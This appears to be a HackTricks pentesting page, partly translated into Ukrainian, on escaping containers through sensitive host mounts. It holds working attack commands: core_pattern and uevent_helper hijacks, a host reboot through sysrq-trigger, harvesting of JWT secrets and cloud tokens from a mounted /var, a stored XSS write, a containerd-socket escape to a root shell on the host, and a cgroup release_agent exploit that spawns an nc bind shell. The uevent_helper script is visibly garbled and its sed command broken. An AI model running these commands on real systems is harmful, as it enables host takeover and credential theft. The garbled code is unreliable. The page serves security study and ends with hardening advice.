# Чутливі монтування

{{#include ../../../../banners/hacktricks-training.md}}

Відкриття `/proc`, `/sys` та `/var` без належної ізоляції простору імен створює значні ризики безпеки, включаючи збільшення поверхні атаки та розкриття інформації. Ці каталоги містять чутливі файли, які, якщо неправильно налаштовані або доступні несанкціонованому користувачу, можуть призвести до втечі з контейнера, модифікації хоста або надати інформацію, що сприяє подальшим атакам. Наприклад, неправильне монтування `-v /proc:/host/proc` може обійти захист AppArmor через його шляхову природу, залишаючи `/host/proc` незахищеним.

**Ви можете знайти додаткові деталі кожної потенційної вразливості в** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Вразливості procfs

### `/proc/sys`

Цей каталог дозволяє доступ для зміни змінних ядра, зазвичай через `sysctl(2)`, і містить кілька підкаталогів, які викликають занепокоєння:

#### **`/proc/sys/kernel/core_pattern`**

- Описано в [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Якщо ви можете записувати в цей файл, можливо, записати конвеєр `|`, за яким слідує шлях до програми або скрипту, який буде виконано після того, як станеться збій.
- Зловмисник може знайти шлях всередині хоста до свого контейнера, виконавши `mount`, і записати шлях до бінарного файлу всередині файлової системи свого контейнера. Потім, викликавши збій програми, змусити ядро виконати бінарний файл поза контейнером.

- **Приклад тестування та експлуатації**:
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Set custom handler
sleep 5 && ./crash & # Trigger handler
```
Перевірте [цей пост](https://pwning.systems/posts/escaping-containers-for-fun/) для отримання додаткової інформації.

Приклад програми, яка викликає збій:
```c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) {
buf[i] = 1;
}
return 0;
}
```
#### **`/proc/sys/kernel/modprobe`**

- Докладно в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Містить шлях до завантажувача модулів ядра, який викликається для завантаження модулів ядра.
- **Приклад перевірки доступу**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Перевірка доступу до modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Згадується в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Глобальний прапор, який контролює, чи панікує ядро або викликає OOM вбивцю, коли виникає умова OOM.

#### **`/proc/sys/fs`**

- Згідно з [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), містить параметри та інформацію про файлову систему.
- Доступ на запис може дозволити різні атаки відмови в обслуговуванні проти хоста.

#### **`/proc/sys/fs/binfmt_misc`**

- Дозволяє реєструвати інтерпретатори для ненативних бінарних форматів на основі їх магічного номера.
- Може призвести до підвищення привілеїв або доступу до кореневого шеллу, якщо `/proc/sys/fs/binfmt_misc/register` доступний для запису.
- Відповідна експлуатація та пояснення:
- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
- Докладний посібник: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Інші в `/proc`

#### **`/proc/config.gz`**

- Може розкрити конфігурацію ядра, якщо `CONFIG_IKCONFIG_PROC` увімкнено.
- Корисно для зловмисників для виявлення вразливостей у запущеному ядрі.

#### **`/proc/sysrq-trigger`**

- Дозволяє викликати команди Sysrq, потенційно викликаючи негайні перезавантаження системи або інші критичні дії.
- **Приклад перезавантаження хоста**:

```bash
echo b > /proc/sysrq-trigger # Перезавантажує хост
```

#### **`/proc/kmsg`**

- Відкриває повідомлення з кільцевого буфера ядра.
- Може допомогти в експлуатації ядра, витоках адрес та надати чутливу інформацію про систему.

#### **`/proc/kallsyms`**

- Перераховує експортовані символи ядра та їх адреси.
- Важливо для розробки експлуатацій ядра, особливо для подолання KASLR.
- Інформація про адреси обмежена, якщо `kptr_restrict` встановлено на `1` або `2`.
- Деталі в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Інтерфейс з пристроєм пам'яті ядра `/dev/mem`.
- Історично вразливий до атак підвищення привілеїв.
- Більше про [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Представляє фізичну пам'ять системи у форматі ELF core.
- Читання може витікати вміст пам'яті хост-системи та інших контейнерів.
- Великий розмір файлу може призвести до проблем з читанням або збоїв програмного забезпечення.
- Докладне використання в [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Альтернативний інтерфейс для `/dev/kmem`, що представляє віртуальну пам'ять ядра.
- Дозволяє читання та запис, отже, безпосереднє модифікування пам'яті ядра.

#### **`/proc/mem`**

- Альтернативний інтерфейс для `/dev/mem`, що представляє фізичну пам'ять.
- Дозволяє читання та запис, модифікація всієї пам'яті вимагає вирішення віртуальних адрес у фізичні.

#### **`/proc/sched_debug`**

- Повертає інформацію про планування процесів, обходячи захисти простору PID.
- Витікає імена процесів, ID та ідентифікатори cgroup.

#### **`/proc/[pid]/mountinfo`**

- Надає інформацію про точки монту в просторі монту процесу.
- Витікає місцезнаходження контейнера `rootfs` або образу.

### Вразливості `/sys`

#### **`/sys/kernel/uevent_helper`**

- Використовується для обробки `uevents` пристроїв ядра.
- Запис у `/sys/kernel/uevent_helper` може виконувати довільні скрипти при спрацьовуванні `uevent`.
- **Приклад для експлуатації**:
```bash

#### Creates a payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Finds host path from OverlayFS mount for container

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Sets uevent_helper to malicious helper

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Triggers a uevent

echo change > /sys/class/mem/null/uevent

#### Reads the output

cat /output
```

#### **`/sys/class/thermal`**

- Controls temperature settings, potentially causing DoS attacks or physical damage.

#### **`/sys/kernel/vmcoreinfo`**

- Leaks kernel addresses, potentially compromising KASLR.

#### **`/sys/kernel/security`**

- Houses `securityfs` interface, allowing configuration of Linux Security Modules like AppArmor.
- Access might enable a container to disable its MAC system.

#### **`/sys/firmware/efi/vars` and `/sys/firmware/efi/efivars`**

- Exposes interfaces for interacting with EFI variables in NVRAM.
- Misconfiguration or exploitation can lead to bricked laptops or unbootable host machines.

#### **`/sys/kernel/debug`**

- `debugfs` offers a "no rules" debugging interface to the kernel.
- History of security issues due to its unrestricted nature.

### `/var` Vulnerabilities

The host's **/var** folder contains container runtime sockets and the containers' filesystems.
If this folder is mounted inside a container, that container will get read-write access to other containers' file systems
with root privileges. This can be abused to pivot between containers, to cause a denial of service, or to backdoor other
containers and applications that run in them.

#### Kubernetes

If a container like this is deployed with Kubernetes:

```yaml
apiVersion: v1  
kind: Pod  
metadata:  
  name: pod-mounts-var  
  labels:  
    app: pentest  
spec:  
  containers:  
    - name: pod-mounts-var-folder  
      image: alpine  
      volumeMounts:  
        - mountPath: /host-var  
          name: noderoot  
      command: [ "/bin/sh", "-c", "--" ]  
      args: [ "while true; do sleep 30; done;" ]  
  volumes:  
    - name: noderoot  
      hostPath:  
        path: /var
```

Inside the **pod-mounts-var-folder** container:

```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```

The XSS was achieved:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Note that the container DOES NOT require a restart or anything. Any changes made via the mounted **/var** folder will be applied instantly.

You can also replace configuration files, binaries, services, application files, and shell profiles to achieve automatic (or semi-automatic) RCE.

##### Access to cloud credentials

The container can read K8s serviceaccount tokens or AWS webidentity tokens
which allows the container to gain unauthorized access to K8s or cloud:

```bash
/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
<SNIP>
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
```

#### Docker

The exploitation in Docker (or in Docker Compose deployments) is exactly the same, except that usually
the other containers' filesystems are available under a different base path:

```bash
$ docker info | grep -i 'docker root\|storage driver'
Драйвер зберігання: overlay2
Коренева директорія Docker: /var/lib/docker
```

So the filesystems are under `/var/lib/docker/overlay2/`:

```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d  
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496  
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f  
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2  
<SNIP>
```

#### Note

The actual paths may differ in different setups, which is why your best bet is to use the **find** command to
locate the other containers' filesystems and SA / web identity tokens



### Other Sensitive Host Sockets and Directories (2023-2025)

Mounting certain host Unix sockets or writable pseudo-filesystems is equivalent to giving the container full root on the node. **Treat the following paths as highly sensitive and never expose them to untrusted workloads**:

```text
/run/containerd/containerd.sock     # сокет containerd CRI
/var/run/crio/crio.sock             # сокет CRI-O
/run/podman/podman.sock             # Podman API (з правами root або без)
/var/run/kubelet.sock               # Kubelet API на вузлах Kubernetes
/run/firecracker-containerd.sock    # Kata / Firecracker
```

Attack example abusing a mounted **containerd** socket:

```bash
# всередині контейнера (сокет змонтовано за адресою /host/run/containerd.sock)
ctr --address /host/run/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /host/run/containerd.sock run --tty --privileged --mount \
type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/bash   # повна root оболонка на хості
```

A similar technique works with **crictl**, **podman** or the **kubelet** API once their respective sockets are exposed.

Writable **cgroup v1** mounts are also dangerous. If `/sys/fs/cgroup` is bind-mounted **rw** and the host kernel is vulnerable to **CVE-2022-0492**, an attacker can set a malicious `release_agent` and execute arbitrary code in the *initial* namespace:

```bash
# припускаючи, що контейнер має CAP_SYS_ADMIN і вразливе ядро
mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release

echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # вимагає CVE-2022-0492

echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
sh -c "echo 0 > /tmp/x/cgroup.procs"  # викликає подію empty-cgroup
```

When the last process leaves the cgroup, `/tmp/pwn` runs **as root on the host**. Patched kernels (>5.8 with commit `32a0db39f30d`) validate the writer’s capabilities and block this abuse.

### Mount-Related Escape CVEs (2023-2025)

* **CVE-2024-21626 – runc “Leaky Vessels” file-descriptor leak**
runc ≤1.1.11 leaked an open directory file descriptor that could point to the host root. A malicious image or `docker exec` could start a container whose *working directory* is already on the host filesystem, enabling arbitrary file read/write and privilege escalation. Fixed in runc 1.1.12 (Docker ≥25.0.3, containerd ≥1.7.14).

```Dockerfile
FROM scratch
WORKDIR /proc/self/fd/4   # 4 == "/" on the host leaked by the runtime
CMD ["/bin/sh"]
```

* **CVE-2024-23651 / 23653 – BuildKit OverlayFS copy-up TOCTOU**
A race condition in the BuildKit snapshotter let an attacker replace a file that was about to be *copy-up* into the container’s rootfs with a symlink to an arbitrary path on the host, gaining write access outside the build context. Fixed in BuildKit v0.12.5 / Buildx 0.12.0. Exploitation requires an untrusted `docker build` on a vulnerable daemon.

### Hardening Reminders (2025)

1. Bind-mount host paths **read-only** whenever possible and add `nosuid,nodev,noexec` mount options.
2. Prefer dedicated side-car proxies or rootless clients instead of exposing the runtime socket directly.
3. Keep the container runtime up-to-date (runc ≥1.1.12, BuildKit ≥0.12.5, containerd ≥1.7.14).
4. In Kubernetes, use `securityContext.readOnlyRootFilesystem: true`, the *restricted* PodSecurity profile and avoid `hostPath` volumes pointing to the paths listed above.

### References

- [runc CVE-2024-21626 advisory](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv)
- [Unit 42 analysis of CVE-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
